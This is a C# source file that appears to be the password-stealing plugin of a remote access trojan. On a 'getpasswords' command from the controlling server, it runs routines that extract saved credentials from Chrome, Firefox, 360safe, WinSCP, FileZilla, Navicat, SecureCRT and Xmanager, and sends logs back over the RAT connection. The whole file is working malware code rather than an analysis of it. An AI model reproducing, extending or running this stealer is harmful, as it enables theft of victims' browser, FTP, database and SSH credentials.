using MessagePackLib.MessagePack;
using System;
using SharpXDecrypt;
using Chrome;
using Firefox;
using Safe360pwd;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "getpasswords":
                        {
                            GetPasswords();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void GetPasswords()
        {
            Log(Connection.Hwid + ": " + "[Chrome]");
            ChromePwd chromePwd = new ChromePwd();
            chromePwd.Run();

            Log(Connection.Hwid + "");
            Log(Connection.Hwid + ": " + "[Firefox]");
            FirefoxPwd firefoxPwd = new FirefoxPwd();
            FirefoxPwd.GetLogins();

            Log(Connection.Hwid + ": " + "[360safe]");
            get360safepass.Run();

            Log(Connection.Hwid + "");
            Log(Connection.Hwid + ": " + "[WinSCP]");
            Log(Connection.Hwid + "");
            WinSCP winSCP = new WinSCP();
            WinSCP.WinSCPCrypto();

            Log(Connection.Hwid + ": " + "[FileZilla]");
            fileZilla fileZilla = new fileZilla();
            fileZilla.FileZillaCrypt();

            Log(Connection.Hwid + "");
            Log(Connection.Hwid + ": " + "[Navicat]");
            NavicatPwd NavicatPwd = new NavicatPwd();
            NavicatPwd.NavicatCrypt();

            Log(Connection.Hwid + "");
            Log(Connection.Hwid + ": " + "[SecureCrt]");
            global::SecureCrtPwd.SecureCrtCrypt();

            Log(Connection.Hwid + "");
            Log(Connection.Hwid + ": " + "[Xmanager]");
            XClass.Decrypt();
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }

    }

}